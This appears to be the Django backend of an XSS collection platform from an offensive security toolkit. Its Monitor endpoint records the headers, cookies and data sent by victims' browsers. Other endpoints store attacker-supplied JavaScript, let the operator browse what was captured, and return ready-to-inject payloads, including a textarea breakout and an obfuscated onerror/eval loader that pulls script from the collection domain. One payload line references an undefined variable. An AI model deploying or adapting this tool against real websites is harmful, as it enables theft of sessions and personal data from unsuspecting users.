#!/usr/bin/env python
# -*- coding: utf-8 -*-
from Web.DatabaseHub import UserInfo,CrossSiteScriptInfo,CrossSiteScriptProject
from django.http import JsonResponse,HttpResponse
from ClassCongregation import ErrorLog,GetPath,randoms
import json
import base64
import re
from config import cross_site_script_uses_domain_names
from Web.Workbench.LogRelated import UserOperationLogRecord,RequestLogRecord

def GetIp(request):
    '''获取请求者的IP信息'''
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')  # 判断是否使用代理
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]  # 使用代理获取真实的ip
    else:
        ip = request.META.get('REMOTE_ADDR')  # 未使用代理获取IP
    return ip

def Monitor(request,data):#用于接收信息的监控
    RequestLogRecord(request, request_api="xss")
    get_request_fragment=""
    try:#正则匹配获取项XSS目生成文件名
        get_request_fragment = re.search(r'/[a-zA-Z0-9]{5}', str(request.get_full_path), re.I).group(0)  # 对URL进行提取处理
        #print(GetRequestFragment[1:6])
    except Exception as e:
        ErrorLog().Write(e)

    if request.method == "POST":
        try:

            if request.headers["Content-Type"]=="application/json":
                data_pack_info = request.body#获取post数据包信息
            else:
                data_pack_info = str(request.POST.dict()).encode('utf-8')#转换成字典后再换装byte类型穿给加密函数
            headers_info = str(request.headers).encode('utf-8')#获取头信息
            CrossSiteScriptInfo().Write(headers=base64.b64encode(headers_info),  #对信息进行编码
                                        ip=GetIp(request),  #获取IP信息
                                        full_url=str(request.build_absolute_uri()),  # 获取完整URL
                                        request_method="POST",
                                        project_associated_file_name=get_request_fragment[1:6],#获取请求的文件，并且删除字符串/符号
                                        data_pack=base64.b64encode(data_pack_info))#写入信息到数据库
        except Exception as e:
            ErrorLog().Write(e)
    elif request.method == "GET":
        try:
            parameter_info=str(request.GET.dict()).encode('utf-8')#获取参数信息
            headers_info=str(request.headers).encode('utf-8')#获取头信息
            CrossSiteScriptInfo().Write(headers=base64.b64encode(headers_info),  # 对信息进行编码
                                        full_url=str(request.build_absolute_uri()),#获取完整URL
                                        ip=GetIp(request),  # 获取IP信息
                                        request_method="GET",
                                        project_associated_file_name=get_request_fragment[1:6],
                                        data_pack=base64.b64encode(parameter_info))  # 写入信息到数据库

        except Exception as e:
            ErrorLog().Write(e)

    return HttpResponse("")


"""create_cross_site_script_project
{
	"token": "",
	"project_name":"project_name",
	"javascript_data":""
}
"""
def GenerateProject(request):#用来生成项目，并且生成文件和用户绑定
    RequestLogRecord(request, request_api="create_cross_site_script_project")
    if request.method == "POST":
        try:
            javascript_data = json.loads(request.body)["javascript_data"]#获取前端传入的加密过的js文件数据
            project_name = json.loads(request.body)["project_name"]#用户自定义的项目名
            token = json.loads(request.body)["token"]
            uid = UserInfo().QueryUidWithToken(token)  # 如果登录成功后就来查询用户名
            if uid != None and javascript_data!=None:  # 查到了UID,并且js数据不为空
                UserOperationLogRecord(request, request_api="create_cross_site_script_project", uid=uid)

                while True:#如果查询确实冲突了
                    javascript_file_name=randoms().result(5)#文件名
                    javascript_file_validity = CrossSiteScriptProject().RepeatInvestigation(file_name=javascript_file_name)#判断文件是否重复
                    if not javascript_file_validity:#如果不冲突的话跳出循环
                        break
                javascript_save_route = GetPath().JavaScriptFilePath() + javascript_file_name  # 获得保存路径
                with open(javascript_save_route, 'w+',encoding='UTF-8') as f:
                    f.write(base64.b64decode(str(javascript_data).encode('utf-8')).decode('utf-8'))#文件内容还要加密
                CrossSiteScriptProject().Write(file_name=javascript_file_name,uid=uid,project_name=project_name)#写到数据库表中
                return JsonResponse({'message': javascript_file_name, 'code': 200, })#返回创建好的文件名
            else:
                return JsonResponse({'message': "小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧", 'code': 403, })
        except Exception as e:
            ErrorLog().Write(e)
            return JsonResponse({'message': '呐呐呐！莎酱被玩坏啦(>^ω^<)', 'code': 169, })
    else:
        return JsonResponse({'message': '请使用Post请求', 'code': 500, })


"""query_cross_site_script_project
{
	"token": "",
	"number_of_pages":"1"
}
"""
def QueryProject(request):#用来查看用户的XSS项目
    RequestLogRecord(request, request_api="query_cross_site_script_project")
    if request.method == "POST":
        try:
            token = json.loads(request.body)["token"]
            number_of_pages = json.loads(request.body)["number_of_pages"]
            uid = UserInfo().QueryUidWithToken(token)  # 如果登录成功后就来查询用户名
            if uid != None :  # 查到了UID
                UserOperationLogRecord(request, request_api="query_cross_site_script_project", uid=uid)
                CrossSiteScriptProjectResult = CrossSiteScriptProject().Query(uid=uid,number_of_pages=int(number_of_pages))  # 查询项目信息
                return JsonResponse({'message': CrossSiteScriptProjectResult, 'code': 200, })

            else:
                return JsonResponse({'message': "小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧", 'code': 403, })
        except Exception as e:
            ErrorLog().Write(e)
            return JsonResponse({'message': '呐呐呐！莎酱被玩坏啦(>^ω^<)', 'code': 169, })
    else:
        return JsonResponse({'message': '请使用Post请求', 'code': 500, })

"""statistical_cross_site_script_project
{
	"token": "xxx"
}
"""
def StatisticalCrossSiteScriptProject(request):#统计项目个数
    RequestLogRecord(request, request_api="statistical_cross_site_script_project")
    if request.method == "POST":
        try:
            token=json.loads(request.body)["token"]
            uid = UserInfo().QueryUidWithToken(token)  # 如果登录成功后就来查询UID
            if uid != None:  # 查到了UID
                UserOperationLogRecord(request, request_api="statistical_cross_site_script_project", uid=uid)
                number=CrossSiteScriptProject().QueryStatistics(uid=uid)#获取当前用户的个数
                return JsonResponse({'message': number, 'code': 200, })
            else:
                return JsonResponse({'message': "小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧", 'code': 403, })
        except Exception as e:
            ErrorLog().Write(e)
            return JsonResponse({'message': "呐呐呐！莎酱被玩坏啦(>^ω^<)", 'code': 169, })

    else:
        return JsonResponse({'message': '请使用Post请求', 'code': 500, })
"""query_cross_site_script_project_data
{
	"token": "",
	"project_associated_file_name":"",
	"number_of_pages":"1"
}
"""
def QueryProjectData(request):  # 用来查看用户的XSS项目中接收的数据
    RequestLogRecord(request, request_api="query_cross_site_script_project_data")
    if request.method == "POST":
        try:
            project_associated_file_name = json.loads(request.body)["project_associated_file_name"]#传入项目生成的文件名
            token = json.loads(request.body)["token"]
            number_of_pages = json.loads(request.body)["number_of_pages"]
            uid = UserInfo().QueryUidWithToken(token)  # 如果登录成功后就来查询用户名
            if uid != None:  # 查到了UID
                UserOperationLogRecord(request, request_api="query_cross_site_script_project_data", uid=uid)
                authority_check = CrossSiteScriptProject().AuthorityCheck(uid=uid,file_name=project_associated_file_name)  # 用来校检CrossSiteScript数据库中文件名和UID相对应

                if authority_check:
                    CrossSiteScriptInfoResult=CrossSiteScriptInfo().Query(project_associated_file_name=project_associated_file_name,
                                                                          number_of_pages=int(number_of_pages))#查询数据库中项目的XSS信息
                    return JsonResponse({'message': CrossSiteScriptInfoResult, 'code': 200, })
                else:
                    return JsonResponse({'message': "你没有查询这个项目的权限哦宝贝~", 'code': 404, })
            else:
                return JsonResponse({'message': "小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧", 'code': 403, })
        except Exception as e:
            ErrorLog().Write(e)
            return JsonResponse({'message': '呐呐呐！莎酱被玩坏啦(>^ω^<)', 'code': 169, })
    else:
        return JsonResponse({'message': '请使用Post请求', 'code': 500, })

"""statistical_cross_site_script_project_data
{
	"token": "xxx",
	"project_associated_file_name":""
}
"""
def StatisticalCrossSiteScriptProjectData(request):#统计项目个数
    RequestLogRecord(request, request_api="statistical_cross_site_script_project_data")
    if request.method == "POST":
        try:
            token=json.loads(request.body)["token"]
            project_associated_file_name = json.loads(request.body)["project_associated_file_name"]#传入项目生成的文件名
            uid = UserInfo().QueryUidWithToken(token)  # 如果登录成功后就来查询UID
            if uid != None:  # 查到了UID
                UserOperationLogRecord(request, request_api="statistical_cross_site_script_project_data", uid=uid)
                check = CrossSiteScriptProject().AuthorityCheck(uid=uid,file_name=project_associated_file_name)  # 用来校检CrossSiteScript数据库中文件名和UID相对应
                if check:
                    number=CrossSiteScriptInfo().QueryStatistics(project_associated_file_name=project_associated_file_name)#查询数据库中项目的XSS信息
                    return JsonResponse({'message': number, 'code': 200, })
                else:
                    return JsonResponse({'message': "你没有查询这个项目的权限哦宝贝~", 'code': 404, })
            else:
                return JsonResponse({'message': "小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧", 'code': 403, })
        except Exception as e:
            ErrorLog().Write(e)
            return JsonResponse({'message': "呐呐呐！莎酱被玩坏啦(>^ω^<)", 'code': 169, })

    else:
        return JsonResponse({'message': '请使用Post请求', 'code': 500, })

"""modify_cross_site_script_project
{
	"token": "",
	"project_associated_file_name":"",
	"project_associated_file_data":""
}
"""
def ModifyProject(request):  # 用来修改XSS项目中的数据
    RequestLogRecord(request, request_api="modify_cross_site_script_project")
    if request.method == "POST":
        try:
            project_associated_file_name = json.loads(request.body)["project_associated_file_name"]#传入项目生成的文件名
            project_associated_file_data = json.loads(request.body)["project_associated_file_data"]#传入base64加密后的数据
            token = json.loads(request.body)["token"]
            uid = UserInfo().QueryUidWithToken(token)  # 如果登录成功后就来查询用户名
            if uid != None:  # 查到了UID
                UserOperationLogRecord(request, request_api="modify_cross_site_script_project", uid=uid)
                check = CrossSiteScriptProject().AuthorityCheck(uid=uid,file_name=project_associated_file_name)  # 用来校检CrossSiteScript数据库中文件名和UID相对应

                if check:#判断文件是属于该用户,如果属于的话就对文件进行修改
                    javascript_file_path=GetPath().JavaScriptFilePath() + project_associated_file_name#获取文件位置
                    with open(javascript_file_path, 'w+',encoding='UTF-8') as f:
                        f.write(base64.b64decode(str(project_associated_file_data).encode('utf-8')).decode('utf-8'))  # 文件内容还要解密
                    return JsonResponse({'message': "文件内容覆盖成功~", 'code': 200, })
                else:
                    return JsonResponse({'message': "你没有查询这个项目的权限哦宝贝~", 'code': 404, })
            else:
                return JsonResponse({'message': "小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧", 'code': 403, })
        except Exception as e:
            ErrorLog().Write(e)
            return JsonResponse({'message': '呐呐呐！莎酱被玩坏啦(>^ω^<)', 'code': 169, })
    else:
        return JsonResponse({'message': '请使用Post请求', 'code': 500, })

"""query_cross_site_script_project_info
{
	"token": "",
	"project_associated_file_name":""
}
"""
def QueryProjectInfo(request):  # 查询项目中详细信息
    RequestLogRecord(request, request_api="query_cross_site_script_project_info")
    if request.method == "POST":
        try:
            project_associated_file_name = json.loads(request.body)["project_associated_file_name"]#传入项目生成的文件名
            token = json.loads(request.body)["token"]
            uid = UserInfo().QueryUidWithToken(token)  # 如果登录成功后就来查询用户名
            if uid != None:  # 查到了UID
                UserOperationLogRecord(request, request_api="query_cross_site_script_project_info", uid=uid)
                check = CrossSiteScriptProject().AuthorityCheck(uid=uid,file_name=project_associated_file_name)  # 用来校检CrossSiteScript数据库中文件名和UID相对应
                if check:#判断文件是属于该用户,如果属于的话就对文件进行修改
                    javascript_file_path=GetPath().JavaScriptFilePath() + project_associated_file_name#获取文件位置
                    read_file_data=open(javascript_file_path, 'r',encoding='UTF-8').read()#读取文件内容
                    return JsonResponse({'message': {"project_associated_file_data":base64.b64encode(str(read_file_data).encode('utf-8')).decode('utf-8'),
                                                     "the_first_use":"""</tExtArEa>'"><sCRiPt sRC=//"""+cross_site_script_uses_domain_names+"/s/"+project_associated_file_name+"></sCrIpT>",
                                                     "the_second_use":"<sCRiPt/SrC=//"+cross_site_script_uses_domain_names+"/s/"+project_associated_file_name+">",
                                                     "the_third_use":"<img sRC=//"+cross_site_script_uses_domain_names+"/s/"+project_associated_file_name+">",
                                                     "exploit_path":"//"+cross_site_script_uses_domain_names+"/s/"+project_associated_file_name,
                                                     "coding_exploit":"""</tEXtArEa>'"><img src=# id=xssyou style=display:none onerror=eval(unescape(/var%20b%3Ddocument.createElement%28%22script%22%29%3Bb.src%3D%22%2F%2F"""+cross_site_script_uses_domain_names+"%2Fs%2F"+ProjectAssociatedFileName+"%22%2BMath.random%28%29%3B%28document.getElementsByTagName%28%22HEAD%22%29%5B0%5D%7C%7Cdocument.body%29.appendChild%28b%29%3B/.source));//>"}, 'code': 200, })
                else:
                    return JsonResponse({'message': "你没有查询这个项目的权限哦宝贝~", 'code': 404, })
            else:
                return JsonResponse({'message': "小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧", 'code': 403, })
        except Exception as e:
            ErrorLog().Write(e)
            return JsonResponse({'message': '呐呐呐！莎酱被玩坏啦(>^ω^<)', 'code': 169, })
    else:
        return JsonResponse({'message': '请使用Post请求', 'code': 500, })

"""delete_cross_site_script_project
{
	"token": "",
	"project_name":"xx"
}
"""
def DeleteProject(request):#用来删除用户的XSS项目
    RequestLogRecord(request, request_api="delete_cross_site_script_project")
    if request.method == "POST":
        try:
            token = json.loads(request.body)["token"]
            project_name = json.loads(request.body)["project_name"]
            uid = UserInfo().QueryUidWithToken(token)  # 如果登录成功后就来查询用户名
            if uid != None :  # 查到了UID
                UserOperationLogRecord(request, request_api="delete_cross_site_script_project", uid=uid)
                result = CrossSiteScriptProject().Delete(uid=uid,project_name=project_name)  # 查询项目信息
                if result:
                    return JsonResponse({'message': "删除成功~", 'code': 200, })
                else:
                    return JsonResponse({'message': "项目删除失败！", 'code': 170, })

            else:
                return JsonResponse({'message': "小宝贝这是非法查询哦(๑•̀ㅂ•́)و✧", 'code': 403, })
        except Exception as e:
            ErrorLog().Write(e)
            return JsonResponse({'message': '呐呐呐！莎酱被玩坏啦(>^ω^<)', 'code': 169, })
    else:
        return JsonResponse({'message': '请使用Post请求', 'code': 500, })
